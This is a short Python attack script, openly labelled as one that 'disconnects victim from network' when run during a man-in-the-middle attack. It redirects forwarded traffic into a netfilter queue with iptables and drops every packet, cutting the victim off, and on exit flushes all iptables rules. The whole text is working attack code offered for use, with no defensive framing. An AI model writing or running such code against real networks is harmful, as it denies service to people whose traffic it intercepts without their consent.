# Script that disconnects victim from network
# Run it with MITM attack to intercept packets from access point

import subprocess
import netfilterqueue

def process_packet(packet):
    print(packet)
    packet.drop()

def main():
    try:
        subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet) 
        queue.run()
    except(KeyboardInterrupt):
        subprocess.call("iptables --flush", shell=True)


if __name__ == '__main__':
    main()
